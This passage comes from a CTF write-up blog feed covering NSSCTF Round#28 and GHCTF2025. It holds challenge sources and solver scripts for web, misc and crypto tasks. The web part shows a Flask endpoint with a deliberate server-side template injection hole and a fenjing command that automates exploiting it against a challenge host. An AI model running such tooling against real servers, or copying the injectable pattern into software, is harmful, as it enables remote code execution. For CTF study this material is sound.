class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        css_url = url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;style.css&#x27;</span>)</span><br><span class="line">        command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> contains_forbidden_keywords(command):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;forbidden.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Loving Music&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="subst">&#123;css_url&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Loving coding&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p class=&quot;emoji&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">&#123;command&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, command=command,css_url=css_url)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;shell.html&#x27;</span>, command=cmd)</span><br></pre></td></tr></table></figure><p><code>render_template_string</code><code>SSTI</code></p><p><code>wsl</code><code>webui</code>(<strong>fuzz</strong><code>wp</code>)<a href="https://www.bx33661.com/archives/nssround-28--webfang-xiang-ti-jie#Coding-Loving"></a><code>crack-request</code><br /><strong>windows</strong><br /><img src="https://picx.zhimg.com/80/v2-20aabab13a61704916d0d120c78745cf_1440w.png" alt="" /><br /><strong>wsl</strong><code>pip install fenjing</code><br /><img src="https://picx.zhimg.com/80/v2-f539c7f490a7e25aced89710414b05f1_1440w.png" alt="" /></p><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">POST /test HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node6.anna.nssctf.cn:<span class="number">24482</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:<span class="number">24482</span></span><br><span class="line">Referer: http://node6.anna.nssctf.cn:<span class="number">24482</span>/</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=<span class="number">1733148706</span>,<span class="number">1733212021</span>,<span class="number">1733212157</span>,<span class="number">1733420774</span>; session=eyJ1c2VyIjoidGVzdCJ9.Z-Elfw.u8hpIKgL8gXSzLW0ayQI4Y3KYjw</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">136.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">136.0</span></span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">11</span></span><br><span class="line"></span><br><span class="line">cmd=PAYLOAD</span><br></pre></td></tr></table></figure><p><code>python3 -m fenjing crack-request -f http.txt --host &quot;node6.anna.nssctf.cn&quot; --port 24482</code></p><h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id=""><a class="markdownIt-Anchor" href="#"></a> ()</h3><p><strong>30</strong><code>base64</code><code>base64</code><code>ip</code><code>python</code><strong></strong>(bushi)<code>NetA Pro</code></p><p><a href="https://nvme0n1p.dev/post/2025-hmg-wp">wp</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from json import load</span></span><br><span class="line"><span class="keyword">from</span> pyshark <span class="keyword">import</span> FileCapture</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\log.log&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> FileCapture(input_file=<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\network_traffic.pcap&quot;</span>, keep_packets=<span class="literal">False</span>):</span><br><span class="line">        tcp = packet.tcp</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(tcp.payload.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)).decode()</span><br><span class="line">        data = b64decode(data).decode()</span><br><span class="line">        data = loads(data)</span><br><span class="line">        msg = data[<span class="string">&quot;msg&quot;</span>]</span><br><span class="line">        <span class="built_in">type</span> = data[<span class="string">&quot;type&quot;</span>]</span><br><span class="line">        msg = b64decode(msg).decode().strip()</span><br><span class="line">        f.write(msg+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>wireshark</code><a href="https://blog.csdn.net/qq_42411587/article/details/119909870"></a></p><p><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">logs = <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\log.log&quot;</span>).readlines()</span><br><span class="line">log_match = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&#x27;(\d+\.\d+\.\d+\.\d+) ?- - \[(.*) \+\d+\] &quot;(\w+) ([\w\/.-]+) HTTP\/1\.1&quot; \d+ \d+ &quot;-&quot; &quot;.*&quot;&#x27;</span>)</span><br><span class="line">ip_maps = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> log <span class="keyword">in</span> logs:</span><br><span class="line">    m = log_match.<span class="keyword">match</span>(log)</span><br><span class="line">    ip = m.group(<span class="number">1</span>)</span><br><span class="line">    time = m.group(<span class="number">2</span>)</span><br><span class="line">    time = datetime.strptime(time, <span class="string">&quot;%d/%b/%Y:%H:%M:%S&quot;</span>)</span><br><span class="line">    method = m.group(<span class="number">3</span>)</span><br><span class="line">    url = m.group(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># print(time_match.match(time).group())</span></span><br><span class="line">    ip_maps[ip] = ip_maps.get(ip, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line">ip_maps = <span class="built_in">sorted</span>(ip_maps.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> ip, count <span class="keyword">in</span> ip_maps:</span><br><span class="line">    <span class="built_in">print</span>(ip, count)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> web</h2><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><p><br /><img src="https://picx.zhimg.com/80/v2-468ee1cb3d384d48548f50216a923796_1440w.png" alt="" /><br /><code>hvang/readme.txt</code><br /><img src="https://picx.zhimg.com/80/v2-6ef314597817ff95786d6b131f99d298_1440w.png" alt="" /><br /><code>guest</code><br /><img src="https://picx.zhimg.com/80/v2-2b615198930c6101c1a05e19cc02c8a5_1440w.png" alt="" /><br /><code>/flag.sh</code><code>flag</code><br /><img src="https://picx.zhimg.com/80/v2-15f2a2c40b856b1ff65df32a149d5971_1440w.png" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-34fd1872100e1ae0a093d60d07a94dd9_1440w.png" alt="" /></p><p><code>user</code></p><h3 id=""><a class="markdownIt-Anchor" href="#"></a> ()</h3><p>QWQ<code>wp</code></p><p></p><h2 id="cryptounsolved"><a class="markdownIt-Anchor" href="#cryptounsolved"></a> Crypto(unsolved)</h2><h3 id="qaq"><a class="markdownIt-Anchor" href="#qaq"></a> qaq</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * y, numbers)</span><br><span class="line"></span><br><span class="line">res = [<span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272555731</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556223</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556437</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556749</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557237</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557459</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557687</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558627</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559523</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560169</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560343</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560433</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560751</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560969</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272561441</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562103</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562601</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563261</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563297</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563391</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563511</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563711</span>]</span><br><span class="line">p = res[<span class="number">11</span>]</span><br><span class="line">pp = mul(res)</span><br><span class="line">K = GF(p)</span><br><span class="line">E = EllipticCurve(K, (<span class="number">0</span>, <span class="number">4</span>))</span><br><span class="line">qwq = <span class="number">0x320238b</span></span><br><span class="line">qaq = E.order()//qwq**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag = pad(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip(),<span class="number">4</span>)</span><br><span class="line">flag_part = [bytes_to_long(flag[i:i+<span class="number">2</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag_part:</span><br><span class="line">    P1 = qaq*E.random_element()</span><br><span class="line">    P2 = qaq*E.random_element()</span><br><span class="line">    out = P1.weil_pairing(P2, qwq)**<span class="number">3</span>*c</span><br><span class="line">    output.append(<span class="built_in">pow</span>(out,qaq, pp))</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[2258729984869869545899085887518820011795880892632317458813070773270633871398785757696896679887453336507722151037267, 1843407310728065127389586068976768146728145160643439144895915852634291722663455873979176336542780552480617232750208, 1107061034832953338095294459542523703297843192927313275050958753437078121375795698115353665062727895555487155331316, 460337686287218470707660572908024613140030922587867288532588857547792028112129697850035268228038619747643899804437, 1659483062154723617504533638726171721668768657049197025961515070605996080663312140357834824850074607457421362000265, 3150528329201636320206556304125544975332446992414777732425647667048147102509308959254762895094589762017857965981432, 3338854035461286314545186888372727000962778038359519702308782495912356677650264814573463929190025956045491115654437, 3042574495339632074308497406446851120362994432361876743901608172567070991832258762751304397604780567703759317642849, 380771388315580393673388198522357440257018642337119013880143084485482127962577943753495690258532782147018511750175, 507222017133457507399048159541059729302482262298099528096040456818913085187752925782279385808732260473494863290057, 533663958640518878580794848474449572155795564171089765377581587253792204491009275840408579120376539757958097910250, 2681145160205204287930367627648683111546318004811732016137828270063753300095675791698398080219566725174890793619305, 3259478178021541801713314504097142165241891541242669456591074651894459393333167453811425864198267757724232689747676, 3553147298452254907907643059383506744982654808021508866104139240155822133286673657139615950259800036058045049186173, 1778776925369812510137824472396145391840300438509021838870105004154301861222612045533034046889878767915343446874895, 3409071358092535255033136229525415652816479844958949032220987821989305575696869929136493897719813036034016228268240, 571819148781137687997336847709735468532344087614483867682513640750800758034003212746545051127998686475933050072942, 2676666310158795770609746651024766841212271213339384335651155407291004834251914242990757216402110096603729617413168, 2557670339976470006330058052583841683167706755578266425502679937976714609864257535859316483527764340425703004883241, 973319024062640263364951783086923560907216776835485042157036675663719529568519121997200478026304141184810597275543, 1189768012357955450386827626693191057999220508190415783719135619271537446794904663649700073564180453068646130539863, 790522915783756530835443034667719516913120763875831140857606265058871034793645280121113275798239222760522467771184]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><code>MOV</code><strong>Weil Pairing</strong><br /><code>wp</code></p><h3 id="ecbag"><a class="markdownIt-Anchor" href="#ecbag"></a> ECBag</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">a, b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;a =&quot;</span>)), <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;b =&quot;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>([a%p, b%p, (a+b)%p, (a-b)%p])) == <span class="number">4</span></span><br><span class="line">E1 = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">E2 = EllipticCurve(Zmod(p), [a+b, a-b])</span><br><span class="line">P, Q = E1.gens()[<span class="number">0</span>], E2.gens()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="number">80</span></span><br><span class="line">s = [choice([<span class="number">0</span>, bytes_to_long(flag)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">sP, sQ = [_*P <span class="keyword">for</span> _ <span class="keyword">in</span> s], [_*Q <span class="keyword">for</span> _ <span class="keyword">in</span> s]</span><br><span class="line">AP, AQ = [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)], [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">encP, encQ = <span class="built_in">sum</span>([AP[_]*sP[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]), <span class="built_in">sum</span>([AQ[_]*sQ[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A =&quot;</span>, [AP, AQ])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc =&quot;</span>, [P.xy(), Q.xy(), encP.xy(), encQ.xy()])</span><br></pre></td></tr></table></figure><h3 id="else"><a class="markdownIt-Anchor" href="#else"></a> else</h3><p><a href="https://blog.weyung.cc/2025/03/22/2025%20%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20-%20Crypto/">wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;nssctf-round28&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#nssctf-round28&quot;&gt;&lt;/a&gt; NSSCTF Round#28&lt;/h1&gt;
&lt;h2 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Anch</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GHCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/10/GHCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/10/GHCTF2025-WriteUp/</id>
    <published>2025-03-09T18:00:00.000Z</published>
    <updated>2025-04-02T17:01:14.032Z</updated>
    
    <content type="html"><![CDATA[<p>(bushi</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><p><strong>Sagemath</strong><strong>10.4</strong>(<br /><a href="https://cocalc.com/features/sage">https://cocalc.com/features/sage</a></p><p>(<code>river</code><code>web</code>)<code>wp</code></p><h2 id="baby_factor"><a class="markdownIt-Anchor" href="#baby_factor"></a> baby_factor</h2><p><code>RSA</code></p><h2 id="baby_signin"><a class="markdownIt-Anchor" href="#baby_signin"></a> baby_signin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line">p=getPrime(<span class="number">128</span>)</span><br><span class="line">q=getPrime(<span class="number">128</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxx&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">m=bytes_to_long(flag.encode())</span><br><span class="line">e=<span class="number">4</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 182756071972245688517047475576147877841</span></span><br><span class="line"><span class="string">q= 305364532854935080710443995362714630091</span></span><br><span class="line"><span class="string">c= 14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line"><span class="string">n= 55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mn>4</mn><mtext></mtext><mi></mi><mtext></mtext><mi>A</mi><mi>M</mi><mi>M</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">e=4\phi AMM</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">4</span><span class="mord cjk_fallback"></span><span class="mord mathnormal"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span 